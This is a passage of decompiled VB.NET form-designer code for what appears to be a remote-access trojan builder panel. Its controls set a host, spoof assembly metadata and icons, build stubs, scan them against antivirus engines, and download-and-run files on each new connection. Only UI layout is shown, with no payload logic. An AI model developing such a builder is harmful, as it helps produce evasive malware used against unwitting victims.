            Me.tb_host.BackColor = Color.FromArgb(&H2D, &H2D, &H30)
            Me.tb_host.Cursor = Cursors.Hand
            Me.tb_host.DrawMode = DrawMode.OwnerDrawFixed
            Me.tb_host.DropDownStyle = ComboBoxStyle.DropDownList
            Me.tb_host.Font = New Font("Segoe UI", 8!)
            Me.tb_host.ForeColor = Color.White
            Me.tb_host.FormattingEnabled = True
            Me.tb_host.HoverColor = Color.DeepPink
            Me.tb_host.ItemHeight = &H12
            Me.tb_host.Items.AddRange(New Object() { "fgs", "gs", "dg" })
            point2 = New Point(&H47, &H29)
            Me.tb_host.Location = point2
            Me.tb_host.Name = "tb_host"
            size2 = New Size(360, &H18)
            Me.tb_host.Size = size2
            Me.tb_host.TabIndex = 1
            Me.FlatLabel3.AutoSize = True
            Me.FlatLabel3.BackColor = Color.Transparent
            Me.FlatLabel3.Font = New Font("Segoe UI", 12!)
            Me.FlatLabel3.ForeColor = Color.White
            point2 = New Point(&H10, &H29)
            Me.FlatLabel3.Location = point2
            Me.FlatLabel3.Name = "FlatLabel3"
            size2 = New Size(&H31, &H15)
            Me.FlatLabel3.Size = size2
            Me.FlatLabel3.TabIndex = 0
            Me.FlatLabel3.Text = "Host: "
            Me.FlatGroupBox4.BackColor = Color.Transparent
            Me.FlatGroupBox4.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FlatGroupBox4.Controls.Add(Me.btn_load_settings)
            Me.FlatGroupBox4.Font = New Font("Segoe UI", 10!)
            point2 = New Point(3, 3)
            Me.FlatGroupBox4.Location = point2
            Me.FlatGroupBox4.Name = "FlatGroupBox4"
            Me.FlatGroupBox4.ShowText = True
            size2 = New Size(&H72, &H56)
            Me.FlatGroupBox4.Size = size2
            Me.FlatGroupBox4.TabIndex = 0
            Me.FlatGroupBox4.Text = "Settings"
            Me.btn_load_settings.BackColor = Color.Transparent
            Me.btn_load_settings.BaseColor = Color.DeepPink
            Me.btn_load_settings.Cursor = Cursors.Hand
            Me.btn_load_settings.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H13, &H25)
            Me.btn_load_settings.Location = point2
            Me.btn_load_settings.Name = "btn_load_settings"
            Me.btn_load_settings.Rounded = False
            size2 = New Size(&H4D, 30)
            Me.btn_load_settings.Size = size2
            Me.btn_load_settings.TabIndex = 0
            Me.btn_load_settings.Text = "Load"
            Me.btn_load_settings.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.TabPage2.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage2.Controls.Add(Me.btn_generate)
            Me.TabPage2.Controls.Add(Me.FlatLabel8)
            Me.TabPage2.Controls.Add(Me.FlatLabel9)
            Me.TabPage2.Controls.Add(Me.FlatLabel10)
            Me.TabPage2.Controls.Add(Me.FlatLabel11)
            Me.TabPage2.Controls.Add(Me.tb_assemblytrademark)
            Me.TabPage2.Controls.Add(Me.tb_assemblyversion)
            Me.TabPage2.Controls.Add(Me.tb_assemblyfileversion)
            Me.TabPage2.Controls.Add(Me.tb_assemblycopyright)
            Me.TabPage2.Controls.Add(Me.FlatLabel7)
            Me.TabPage2.Controls.Add(Me.FlatLabel6)
            Me.TabPage2.Controls.Add(Me.FlatLabel5)
            Me.TabPage2.Controls.Add(Me.FlatLabel4)
            Me.TabPage2.Controls.Add(Me.tb_assemblydescription)
            Me.TabPage2.Controls.Add(Me.tb_assemblycompany)
            Me.TabPage2.Controls.Add(Me.tb_assemblyproduct)
            Me.TabPage2.Controls.Add(Me.tb_assemblytitle)
            point2 = New Point(140, 4)
            Me.TabPage2.Location = point2
            Me.TabPage2.Name = "TabPage2"
            padding2 = New Padding(3)
            Me.TabPage2.Padding = padding2
            size2 = New Size(&H240, &HEB)
            Me.TabPage2.Size = size2
            Me.TabPage2.TabIndex = 1
            Me.TabPage2.Text = "Assembly Information"
            Me.btn_generate.BackColor = Color.Transparent
            Me.btn_generate.BaseColor = Color.White
            Me.btn_generate.Cursor = Cursors.Hand
            Me.btn_generate.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H1D0, &HC0)
            Me.btn_generate.Location = point2
            Me.btn_generate.Name = "btn_generate"
            Me.btn_generate.Rounded = False
            size2 = New Size(&H6A, &H20)
            Me.btn_generate.Size = size2
            Me.btn_generate.TabIndex = &H18
            Me.btn_generate.Text = "Generate"
            Me.btn_generate.TextColor = Color.Black
            Me.FlatLabel8.AutoSize = True
            Me.FlatLabel8.BackColor = Color.Transparent
            Me.FlatLabel8.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel8.ForeColor = Color.White
            point2 = New Point(240, &HB6)
            Me.FlatLabel8.Location = point2
            Me.FlatLabel8.Name = "FlatLabel8"
            size2 = New Size(130, 13)
            Me.FlatLabel8.Size = size2
            Me.FlatLabel8.TabIndex = &H17
            Me.FlatLabel8.Text = "Assembly File Versiont:  "
            Me.FlatLabel9.AutoSize = True
            Me.FlatLabel9.BackColor = Color.Transparent
            Me.FlatLabel9.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel9.ForeColor = Color.White
            point2 = New Point(240, 120)
            Me.FlatLabel9.Location = point2
            Me.FlatLabel9.Name = "FlatLabel9"
            size2 = New Size(&H69, 13)
            Me.FlatLabel9.Size = size2
            Me.FlatLabel9.TabIndex = &H16
            Me.FlatLabel9.Text = "Assembly Version:  "
            Me.FlatLabel10.AutoSize = True
            Me.FlatLabel10.BackColor = Color.Transparent
            Me.FlatLabel10.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel10.ForeColor = Color.White
            point2 = New Point(240, &H3D)
            Me.FlatLabel10.Location = point2
            Me.FlatLabel10.Name = "FlatLabel10"
            size2 = New Size(&H77, 13)
            Me.FlatLabel10.Size = size2
            Me.FlatLabel10.TabIndex = &H15
            Me.FlatLabel10.Text = "Assembly Trademark:  "
            Me.FlatLabel11.AutoSize = True
            Me.FlatLabel11.BackColor = Color.Transparent
            Me.FlatLabel11.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel11.ForeColor = Color.White
            point2 = New Point(240, 6)
            Me.FlatLabel11.Location = point2
            Me.FlatLabel11.Name = "FlatLabel11"
            size2 = New Size(&H72, 13)
            Me.FlatLabel11.Size = size2
            Me.FlatLabel11.TabIndex = 20
            Me.FlatLabel11.Text = "Assembly Copyright: "
            Me.tb_assemblytrademark.BackColor = Color.White
            Me.tb_assemblytrademark.Font = New Font("Segoe UI", 8!)
            point2 = New Point(&HF3, &H4D)
            Me.tb_assemblytrademark.Location = point2
            Me.tb_assemblytrademark.MaxLength = &H7FFF
            Me.tb_assemblytrademark.Multiline = False
            Me.tb_assemblytrademark.Name = "tb_assemblytrademark"
            Me.tb_assemblytrademark.ReadOnly = False
            size2 = New Size(&HC5, &H1A)
            Me.tb_assemblytrademark.Size = size2
            Me.tb_assemblytrademark.TabIndex = &H12
            Me.tb_assemblytrademark.TextAlign = HorizontalAlignment.Left
            Me.tb_assemblytrademark.TextColor = Color.White
            Me.tb_assemblytrademark.UseSystemPasswordChar = False
            Me.tb_assemblyversion.BackColor = Color.White
            Me.tb_assemblyversion.Font = New Font("Segoe UI", 8!)
            point2 = New Point(&HF3, &H88)
            Me.tb_assemblyversion.Location = point2
            Me.tb_assemblyversion.MaxLength = &H7FFF
            Me.tb_assemblyversion.Multiline = False
            Me.tb_assemblyversion.Name = "tb_assemblyversion"
            Me.tb_assemblyversion.ReadOnly = False
            size2 = New Size(&HC5, &H1A)
            Me.tb_assemblyversion.Size = size2
            Me.tb_assemblyversion.TabIndex = &H13
            Me.tb_assemblyversion.TextAlign = HorizontalAlignment.Left
            Me.tb_assemblyversion.TextColor = Color.White
            Me.tb_assemblyversion.UseSystemPasswordChar = False
            Me.tb_assemblyfileversion.BackColor = Color.White
            Me.tb_assemblyfileversion.Font = New Font("Segoe UI", 8!)
            point2 = New Point(&HF3, &HC6)
            Me.tb_assemblyfileversion.Location = point2
            Me.tb_assemblyfileversion.MaxLength = &H7FFF
            Me.tb_assemblyfileversion.Multiline = False
            Me.tb_assemblyfileversion.Name = "tb_assemblyfileversion"
            Me.tb_assemblyfileversion.ReadOnly = False
            size2 = New Size(&HC5, &H1A)
            Me.tb_assemblyfileversion.Size = size2
            Me.tb_assemblyfileversion.TabIndex = &H11
            Me.tb_assemblyfileversion.TextAlign = HorizontalAlignment.Left
            Me.tb_assemblyfileversion.TextColor = Color.White
            Me.tb_assemblyfileversion.UseSystemPasswordChar = False
            Me.tb_assemblycopyright.BackColor = Color.White
            Me.tb_assemblycopyright.Font = New Font("Segoe UI", 8!)
            point2 = New Point(&HF3, &H16)
            Me.tb_assemblycopyright.Location = point2
            Me.tb_assemblycopyright.MaxLength = &H7FFF
            Me.tb_assemblycopyright.Multiline = False
            Me.tb_assemblycopyright.Name = "tb_assemblycopyright"
            Me.tb_assemblycopyright.ReadOnly = False
            size2 = New Size(&HC5, &H1A)
            Me.tb_assemblycopyright.Size = size2
            Me.tb_assemblycopyright.TabIndex = &H10
            Me.tb_assemblycopyright.TextAlign = HorizontalAlignment.Left
            Me.tb_assemblycopyright.TextColor = Color.White
            Me.tb_assemblycopyright.UseSystemPasswordChar = False
            Me.FlatLabel7.AutoSize = True
            Me.FlatLabel7.BackColor = Color.Transparent
            Me.FlatLabel7.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel7.ForeColor = Color.White
            point2 = New Point(6, &HB6)
            Me.FlatLabel7.Location = point2
            Me.FlatLabel7.Name = "FlatLabel7"
            size2 = New Size(&H6A, 13)
            Me.FlatLabel7.Size = size2
            Me.FlatLabel7.TabIndex = 15
            Me.FlatLabel7.Text = "Assembly Product:  "
            Me.FlatLabel6.AutoSize = True
            Me.FlatLabel6.BackColor = Color.Transparent
            Me.FlatLabel6.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel6.ForeColor = Color.White
            point2 = New Point(6, 120)
            Me.FlatLabel6.Location = point2
            Me.FlatLabel6.Name = "FlatLabel6"
            size2 = New Size(&H72, 13)
            Me.FlatLabel6.Size = size2
            Me.FlatLabel6.TabIndex = 14
            Me.FlatLabel6.Text = "Assembly Company:  "
            Me.FlatLabel5.AutoSize = True
            Me.FlatLabel5.BackColor = Color.Transparent
            Me.FlatLabel5.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel5.ForeColor = Color.White
            point2 = New Point(6, &H3D)
            Me.FlatLabel5.Location = point2
            Me.FlatLabel5.Name = "FlatLabel5"
            size2 = New Size(&H7D, 13)
            Me.FlatLabel5.Size = size2
            Me.FlatLabel5.TabIndex = 13
            Me.FlatLabel5.Text = "Assembly Description:  "
            Me.FlatLabel4.AutoSize = True
            Me.FlatLabel4.BackColor = Color.Transparent
            Me.FlatLabel4.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel4.ForeColor = Color.White
            point2 = New Point(6, 6)
            Me.FlatLabel4.Location = point2
            Me.FlatLabel4.Name = "FlatLabel4"
            size2 = New Size(&H54, 13)
            Me.FlatLabel4.Size = size2
            Me.FlatLabel4.TabIndex = 12
            Me.FlatLabel4.Text = "Assembly Title: "
            Me.tb_assemblydescription.BackColor = Color.White
            Me.tb_assemblydescription.Font = New Font("Segoe UI", 8!)
            point2 = New Point(9, &H4D)
            Me.tb_assemblydescription.Location = point2
            Me.tb_assemblydescription.MaxLength = &H7FFF
            Me.tb_assemblydescription.Multiline = False
            Me.tb_assemblydescription.Name = "tb_assemblydescription"
            Me.tb_assemblydescription.ReadOnly = False
            size2 = New Size(&HC5, &H1A)
            Me.tb_assemblydescription.Size = size2
            Me.tb_assemblydescription.TabIndex = 4
            Me.tb_assemblydescription.TextAlign = HorizontalAlignment.Left
            Me.tb_assemblydescription.TextColor = Color.White
            Me.tb_assemblydescription.UseSystemPasswordChar = False
            Me.tb_assemblycompany.BackColor = Color.White
            Me.tb_assemblycompany.Font = New Font("Segoe UI", 8!)
            point2 = New Point(9, &H88)
            Me.tb_assemblycompany.Location = point2
            Me.tb_assemblycompany.MaxLength = &H7FFF
            Me.tb_assemblycompany.Multiline = False
            Me.tb_assemblycompany.Name = "tb_assemblycompany"
            Me.tb_assemblycompany.ReadOnly = False
            size2 = New Size(&HC5, &H1A)
            Me.tb_assemblycompany.Size = size2
            Me.tb_assemblycompany.TabIndex = 4
            Me.tb_assemblycompany.TextAlign = HorizontalAlignment.Left
            Me.tb_assemblycompany.TextColor = Color.White
            Me.tb_assemblycompany.UseSystemPasswordChar = False
            Me.tb_assemblyproduct.BackColor = Color.White
            Me.tb_assemblyproduct.Font = New Font("Segoe UI", 8!)
            point2 = New Point(9, &HC6)
            Me.tb_assemblyproduct.Location = point2
            Me.tb_assemblyproduct.MaxLength = &H7FFF
            Me.tb_assemblyproduct.Multiline = False
            Me.tb_assemblyproduct.Name = "tb_assemblyproduct"
            Me.tb_assemblyproduct.ReadOnly = False
            size2 = New Size(&HC5, &H1A)
            Me.tb_assemblyproduct.Size = size2
            Me.tb_assemblyproduct.TabIndex = 3
            Me.tb_assemblyproduct.TextAlign = HorizontalAlignment.Left
            Me.tb_assemblyproduct.TextColor = Color.White
            Me.tb_assemblyproduct.UseSystemPasswordChar = False
            Me.tb_assemblytitle.BackColor = Color.White
            Me.tb_assemblytitle.Font = New Font("Segoe UI", 8!)
            point2 = New Point(9, &H16)
            Me.tb_assemblytitle.Location = point2
            Me.tb_assemblytitle.MaxLength = &H7FFF
            Me.tb_assemblytitle.Multiline = False
            Me.tb_assemblytitle.Name = "tb_assemblytitle"
            Me.tb_assemblytitle.ReadOnly = False
            size2 = New Size(&HC5, &H1A)
            Me.tb_assemblytitle.Size = size2
            Me.tb_assemblytitle.TabIndex = 0
            Me.tb_assemblytitle.TextAlign = HorizontalAlignment.Left
            Me.tb_assemblytitle.TextColor = Color.White
            Me.tb_assemblytitle.UseSystemPasswordChar = False
            Me.TabPage3.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage3.Controls.Add(Me.FlatGroupBox8)
            Me.TabPage3.Controls.Add(Me.FlatGroupBox7)
            point2 = New Point(140, 4)
            Me.TabPage3.Location = point2
            Me.TabPage3.Name = "TabPage3"
            size2 = New Size(&H240, &HEB)
            Me.TabPage3.Size = size2
            Me.TabPage3.TabIndex = 2
            Me.TabPage3.Text = "Final Build Settings"
            Me.FlatGroupBox8.BackColor = Color.Transparent
            Me.FlatGroupBox8.BaseColor = Color.Black
            Me.FlatGroupBox8.Controls.Add(Me.cb_savesettings)
            Me.FlatGroupBox8.Controls.Add(Me.ProgressBar1)
            Me.FlatGroupBox8.Controls.Add(Me.btn_build)
            Me.FlatGroupBox8.Controls.Add(Me.rtb_output)
            Me.FlatGroupBox8.Font = New Font("Segoe UI", 10!)
            point2 = New Point(&HC7, 1)
            Me.FlatGroupBox8.Location = point2
            Me.FlatGroupBox8.Name = "FlatGroupBox8"
            Me.FlatGroupBox8.ShowText = True
            size2 = New Size(&H179, &HE8)
            Me.FlatGroupBox8.Size = size2
            Me.FlatGroupBox8.TabIndex = 1
            Me.FlatGroupBox8.Text = "Build"
            Me.cb_savesettings.BackColor = Color.Black
            Me.cb_savesettings.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.cb_savesettings.BorderColor = Color.White
            Me.cb_savesettings.Checked = False
            Me.cb_savesettings.Cursor = Cursors.Hand
            Me.cb_savesettings.Font = New Font("Segoe UI", 10!)
            point2 = New Point(14, &HC1)
            Me.cb_savesettings.Location = point2
            Me.cb_savesettings.Name = "cb_savesettings"
            Me.cb_savesettings.Options = _Options.Style1
            size2 = New Size(&H70, &H16)
            Me.cb_savesettings.Size = size2
            Me.cb_savesettings.TabIndex = 3
            Me.cb_savesettings.Text = "Save Settings"
            Me.ProgressBar1.BackColor = Color.White
            Me.ProgressBar1.DarkerProgress = Color.DeepPink
            point2 = New Point(14, &H8B)
            Me.ProgressBar1.Location = point2
            Me.ProgressBar1.Name = "ProgressBar1"
            Me.ProgressBar1.ProgressColor = Color.DeepPink
            size2 = New Size(&H15D, &H2A)
            Me.ProgressBar1.Size = size2
            Me.ProgressBar1.TabIndex = 2
            Me.ProgressBar1.Text = "FlatProgressBar1"
            Me.btn_build.BackColor = Color.Transparent
            Me.btn_build.BaseColor = Color.DarkViolet
            Me.btn_build.Cursor = Cursors.Hand
            Me.btn_build.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H101, &HBA)
            Me.btn_build.Location = point2
            Me.btn_build.Name = "btn_build"
            Me.btn_build.Rounded = False
            size2 = New Size(&H6A, &H20)
            Me.btn_build.Size = size2
            Me.btn_build.TabIndex = 1
            Me.btn_build.Text = "Build"
            Me.btn_build.TextColor = Color.FromArgb(&HF3, &HF3, &HF3)
            Me.rtb_output.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.rtb_output.ForeColor = Color.White
            point2 = New Point(14, &H27)
            Me.rtb_output.Location = point2
            Me.rtb_output.Name = "rtb_output"
            size2 = New Size(&H15D, &H60)
            Me.rtb_output.Size = size2
            Me.rtb_output.TabIndex = 0
            Me.rtb_output.Text = ""
            Me.FlatGroupBox7.BackColor = Color.Transparent
            Me.FlatGroupBox7.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FlatGroupBox7.Controls.Add(Me.cb_icon)
            Me.FlatGroupBox7.Controls.Add(Me.btn_selecticn)
            Me.FlatGroupBox7.Controls.Add(Me.PictureBox_Icon)
            Me.FlatGroupBox7.Font = New Font("Segoe UI", 10!)
            point2 = New Point(3, 3)
            Me.FlatGroupBox7.Location = point2
            Me.FlatGroupBox7.Name = "FlatGroupBox7"
            Me.FlatGroupBox7.ShowText = True
            size2 = New Size(&HC0, 230)
            Me.FlatGroupBox7.Size = size2
            Me.FlatGroupBox7.TabIndex = 0
            Me.FlatGroupBox7.Text = "Select Icon"
            Me.cb_icon.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.cb_icon.BaseColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.cb_icon.BorderColor = Color.DeepPink
            Me.cb_icon.Checked = False
            Me.cb_icon.Cursor = Cursors.Hand
            Me.cb_icon.Font = New Font("Segoe UI", 10!)
            point2 = New Point(&H10, &H25)
            Me.cb_icon.Location = point2
            Me.cb_icon.Name = "cb_icon"
            Me.cb_icon.Options = _Options.Style1
            size2 = New Size(&H70, &H16)
            Me.cb_icon.Size = size2
            Me.cb_icon.TabIndex = 2
            Me.cb_icon.Text = "Enable?"
            Me.btn_selecticn.BackColor = Color.Transparent
            Me.btn_selecticn.BaseColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.btn_selecticn.Cursor = Cursors.Hand
            Me.btn_selecticn.Enabled = False
            Me.btn_selecticn.Font = New Font("Segoe UI", 12!)
            point2 = New Point(&H2A, &HB8)
            Me.btn_selecticn.Location = point2
            Me.btn_selecticn.Name = "btn_selecticn"
            Me.btn_selecticn.Rounded = False
            size2 = New Size(&H6A, &H20)
            Me.btn_selecticn.Size = size2
            Me.btn_selecticn.TabIndex = 1
            Me.btn_selecticn.Text = "Select"
            Me.btn_selecticn.TextColor = Color.DeepPink
            Me.PictureBox_Icon.Enabled = False
            point2 = New Point(&H25, &H41)
            Me.PictureBox_Icon.Location = point2
            Me.PictureBox_Icon.Name = "PictureBox_Icon"
            size2 = New Size(&H71, &H71)
            Me.PictureBox_Icon.Size = size2
            Me.PictureBox_Icon.SizeMode = PictureBoxSizeMode.StretchImage
            Me.PictureBox_Icon.TabIndex = 0
            Me.PictureBox_Icon.TabStop = False
            Me.TabPage4.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage4.Controls.Add(Me.Panel2)
            Me.TabPage4.Controls.Add(Me.ListViewScan)
            Me.TabPage4.Controls.Add(Me.FlatLabel20)
            point2 = New Point(140, 4)
            Me.TabPage4.Location = point2
            Me.TabPage4.Name = "TabPage4"
            size2 = New Size(&H240, &HEB)
            Me.TabPage4.Size = size2
            Me.TabPage4.TabIndex = 3
            Me.TabPage4.Text = "Multi AV Scanner"
            Me.Panel2.Controls.Add(Me.pb_scan)
            point2 = New Point(1, 0)
            Me.Panel2.Location = point2
            Me.Panel2.Name = "Panel2"
            size2 = New Size(&H240, &HEB)
            Me.Panel2.Size = size2
            Me.Panel2.TabIndex = 3
            point2 = New Point(3, 4)
            Me.pb_scan.Location = point2
            Me.pb_scan.Name = "pb_scan"
            size2 = New Size(&H239, &HE2)
            Me.pb_scan.Size = size2
            Me.pb_scan.SizeMode = PictureBoxSizeMode.CenterImage
            Me.pb_scan.TabIndex = 0
            Me.pb_scan.TabStop = False
            Me.ListViewScan.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.ListViewScan.Columns.AddRange(New ColumnHeader() { Me.avs, Me.scans })
            Me.ListViewScan.ForeColor = Color.White
            Me.ListViewScan.FullRowSelect = True
            Me.ListViewScan.GridLines = True
            point2 = New Point(11, &H18)
            Me.ListViewScan.Location = point2
            Me.ListViewScan.Name = "ListViewScan"
            size2 = New Size(&H232, &HD0)
            Me.ListViewScan.Size = size2
            Me.ListViewScan.TabIndex = 2
            Me.ListViewScan.UseCompatibleStateImageBehavior = False
            Me.ListViewScan.View = View.Details
            Me.avs.Text = "AntiVirus Engines"
            Me.avs.Width = &H110
            Me.scans.Text = "Scan Result"
            Me.scans.Width = &H100
            Me.FlatLabel20.AutoSize = True
            Me.FlatLabel20.BackColor = Color.Transparent
            Me.FlatLabel20.Font = New Font("Segoe UI", 8!)
            Me.FlatLabel20.ForeColor = Color.White
            point2 = New Point(8, 8)
            Me.FlatLabel20.Location = point2
            Me.FlatLabel20.Name = "FlatLabel20"
            size2 = New Size(&H48, 13)
            Me.FlatLabel20.Size = size2
            Me.FlatLabel20.TabIndex = 0
            Me.FlatLabel20.Text = "Scan Result: "
            Me.PageSettings.BackColor = Color.FromArgb(60, 70, &H49)
            Me.PageSettings.Controls.Add(Me.DotNetBarTabcontrol2)
            point2 = New Point(4, &H2C)
            Me.PageSettings.Location = point2
            Me.PageSettings.Name = "PageSettings"
            size2 = New Size(&H2D1, &HF4)
            Me.PageSettings.Size = size2
            Me.PageSettings.TabIndex = 2
            Me.PageSettings.Text = "Settings"
            Me.DotNetBarTabcontrol2.Alignment = TabAlignment.Left
            Me.DotNetBarTabcontrol2.Controls.Add(Me.TabPage5)
            Me.DotNetBarTabcontrol2.Controls.Add(Me.TabPage6)
            Me.DotNetBarTabcontrol2.Controls.Add(Me.TabPage7)
            Me.DotNetBarTabcontrol2.Controls.Add(Me.TabPage8)
            Me.DotNetBarTabcontrol2.Controls.Add(Me.TabPage9)
            size2 = New Size(&H2C, &H88)
            Me.DotNetBarTabcontrol2.ItemSize = size2
            point2 = New Point(1, 1)
            Me.DotNetBarTabcontrol2.Location = point2
            Me.DotNetBarTabcontrol2.Multiline = True
            Me.DotNetBarTabcontrol2.Name = "DotNetBarTabcontrol2"
            Me.DotNetBarTabcontrol2.SelectedIndex = 0
            size2 = New Size(720, &HF3)
            Me.DotNetBarTabcontrol2.Size = size2
            Me.DotNetBarTabcontrol2.SizeMode = TabSizeMode.Fixed
            Me.DotNetBarTabcontrol2.TabIndex = 0
            Me.TabPage5.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage5.Controls.Add(Me.FlatGroupBox2)
            Me.TabPage5.Controls.Add(Me.FlatGroupBox1)
            point2 = New Point(140, 4)
            Me.TabPage5.Location = point2
            Me.TabPage5.Name = "TabPage5"
            padding2 = New Padding(3)
            Me.TabPage5.Padding = padding2
            size2 = New Size(&H240, &HEB)
            Me.TabPage5.Size = size2
            Me.TabPage5.TabIndex = 0
            Me.TabPage5.Text = "Connection"
            Me.FlatGroupBox2.BackColor = Color.Transparent
            Me.FlatGroupBox2.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FlatGroupBox2.Controls.Add(Me.cb_sc)
            Me.FlatGroupBox2.Controls.Add(Me.cb_ac)
            Me.FlatGroupBox2.Controls.Add(Me.cb_sound)
            Me.FlatGroupBox2.Controls.Add(Me.cb_notify)
            Me.FlatGroupBox2.Font = New Font("Segoe UI", 10!)
            point2 = New Point(&H198, 6)
            Me.FlatGroupBox2.Location = point2
            Me.FlatGroupBox2.Name = "FlatGroupBox2"
            Me.FlatGroupBox2.ShowText = True
            size2 = New Size(&HA2, 230)
            Me.FlatGroupBox2.Size = size2
            Me.FlatGroupBox2.TabIndex = 4
            Me.FlatGroupBox2.Text = "Options"
            Me.cb_sc.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.cb_sc.BaseColor = Color.DeepPink
            Me.cb_sc.BorderColor = Color.White
            Me.cb_sc.Checked = False
            Me.cb_sc.Cursor = Cursors.Hand
            Me.cb_sc.Font = New Font("Segoe UI", 10!)
            Me.cb_sc.ForeColor = Color.White
            point2 = New Point(&H13, &H83)
            Me.cb_sc.Location = point2
            Me.cb_sc.Name = "cb_sc"
            Me.cb_sc.Options = _Options.Style1
            size2 = New Size(&H7F, &H16)
            Me.cb_sc.Size = size2
            Me.cb_sc.TabIndex = 3
            Me.cb_sc.Text = "Autoscan server"
            Me.cb_ac.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.cb_ac.BaseColor = Color.DeepPink
            Me.cb_ac.BorderColor = Color.White
            Me.cb_ac.Checked = False
            Me.cb_ac.Cursor = Cursors.Hand
            Me.cb_ac.Font = New Font("Segoe UI", 10!)
            Me.cb_ac.ForeColor = Color.White
            point2 = New Point(&H13, &H67)
            Me.cb_ac.Location = point2
            Me.cb_ac.Name = "cb_ac"
            Me.cb_ac.Options = _Options.Style1
            size2 = New Size(&H7F, &H16)
            Me.cb_ac.Size = size2
            Me.cb_ac.TabIndex = 2
            Me.cb_ac.Text = "Autoconnect"
            Me.cb_sound.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.cb_sound.BaseColor = Color.DeepPink
            Me.cb_sound.BorderColor = Color.White
            Me.cb_sound.Checked = False
            Me.cb_sound.Cursor = Cursors.Hand
            Me.cb_sound.Font = New Font("Segoe UI", 10!)
            Me.cb_sound.ForeColor = Color.White
            point2 = New Point(&H13, &H4B)
            Me.cb_sound.Location = point2
            Me.cb_sound.Name = "cb_sound"
            Me.cb_sound.Options = _Options.Style1
            size2 = New Size(&H7F, &H16)
            Me.cb_sound.Size = size2
            Me.cb_sound.TabIndex = 1
            Me.cb_sound.Text = "Play Sound"
            Me.cb_notify.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.cb_notify.BaseColor = Color.DeepPink
            Me.cb_notify.BorderColor = Color.White
            Me.cb_notify.Checked = False
            Me.cb_notify.Cursor = Cursors.Hand
            Me.cb_notify.Font = New Font("Segoe UI", 10!)
            Me.cb_notify.ForeColor = Color.White
            point2 = New Point(&H13, &H2F)
            Me.cb_notify.Location = point2
            Me.cb_notify.Name = "cb_notify"
            Me.cb_notify.Options = _Options.Style1
            size2 = New Size(&H7F, &H16)
            Me.cb_notify.Size = size2
            Me.cb_notify.TabIndex = 0
            Me.cb_notify.Text = "Show Notification"
            Me.FlatGroupBox1.BackColor = Color.Transparent
            Me.FlatGroupBox1.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FlatGroupBox1.Controls.Add(Me.boxhosts)
            Me.FlatGroupBox1.Font = New Font("Segoe UI", 10!)
            Me.FlatGroupBox1.ForeColor = Color.White
            point2 = New Point(6, 6)
            Me.FlatGroupBox1.Location = point2
            Me.FlatGroupBox1.Name = "FlatGroupBox1"
            Me.FlatGroupBox1.ShowText = True
            size2 = New Size(&H18C, 230)
            Me.FlatGroupBox1.Size = size2
            Me.FlatGroupBox1.TabIndex = 3
            Me.FlatGroupBox1.Text = "Hosts"
            Me.boxhosts.BackColor = Color.FromArgb(&H2D, &H2F, &H31)
            Me.boxhosts.ContextMenuStrip = Me.ContextDeleteHosts
            Me.boxhosts.items = New String(0  - 1) {}
            point2 = New Point(&H11, &H25)
            Me.boxhosts.Location = point2
            Me.boxhosts.Name = "boxhosts"
            Me.boxhosts.SelectedColor = Color.DeepPink
            size2 = New Size(&H16A, &HB1)
            Me.boxhosts.Size = size2
            Me.boxhosts.TabIndex = 4
            Me.boxhosts.Text = "FlatListBox1"
            Me.TabPage6.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            Me.TabPage6.Controls.Add(Me.FlatGroupBox3)
            point2 = New Point(140, 4)
            Me.TabPage6.Location = point2
            Me.TabPage6.Name = "TabPage6"
            padding2 = New Padding(3)
            Me.TabPage6.Padding = padding2
            size2 = New Size(&H240, &HEB)
            Me.TabPage6.Size = size2
            Me.TabPage6.TabIndex = 1
            Me.TabPage6.Text = "On Connect"
            Me.FlatGroupBox3.BackColor = Color.Transparent
            Me.FlatGroupBox3.BaseColor = Color.FromArgb(&H6F, &H1F, &H95)
            Me.FlatGroupBox3.Controls.Add(Me.tb_runfile)
            Me.FlatGroupBox3.Controls.Add(Me.FlatLabel2)
            Me.FlatGroupBox3.Controls.Add(Me.toggledownload)
            Me.FlatGroupBox3.Controls.Add(Me.tb_web)
            Me.FlatGroupBox3.Controls.Add(Me.toggleweb)
            Me.FlatGroupBox3.Controls.Add(Me.FlatLabel1)
            Me.FlatGroupBox3.Font = New Font("Segoe UI", 10!)
            point2 = New Point(6, 6)
            Me.FlatGroupBox3.Location = point2
            Me.FlatGroupBox3.Name = "FlatGroupBox3"
            Me.FlatGroupBox3.ShowText = True
            size2 = New Size(570, 230)
            Me.FlatGroupBox3.Size = size2
            Me.FlatGroupBox3.TabIndex = 0
            Me.FlatGroupBox3.Text = "Do on new connection"
            Me.tb_runfile.BackColor = Color.FromArgb(&H2E, &H2E, &H2E)
            point2 = New Point(&H102, &H52)
            Me.tb_runfile.Location = point2
            Me.tb_runfile.MaxLength = &H7FFF
